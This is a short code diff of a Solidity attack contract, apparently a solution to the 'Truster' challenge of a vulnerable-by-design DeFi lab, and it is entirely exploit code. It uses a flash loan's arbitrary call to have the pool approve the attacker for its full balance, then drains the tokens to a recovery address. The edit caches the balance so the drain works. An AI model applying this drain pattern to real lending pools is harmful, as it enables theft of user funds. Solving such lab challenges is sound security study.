@@ -16,17 +16,17 @@ contract AttackTruster {
     }
 
     function attack() external returns(bool){
+        uint amount = token.balanceOf(address(pool));
         require(
             pool.flashLoan(
                 0,
                 address(this),
                 address(token),
-                abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool)))
-            )
+                abi.encodeWithSignature("approve(address,uint256)", address(this), amount))
         );
 
-        require(token.transferFrom(address(pool), address(this), token.balanceOf(address(pool))));
-        require(token.transfer(recovery, token.balanceOf(address(pool))));
+        require(token.transferFrom(address(pool), address(this), amount));
+        require(token.transfer(recovery, amount));
 
         return true;
     }
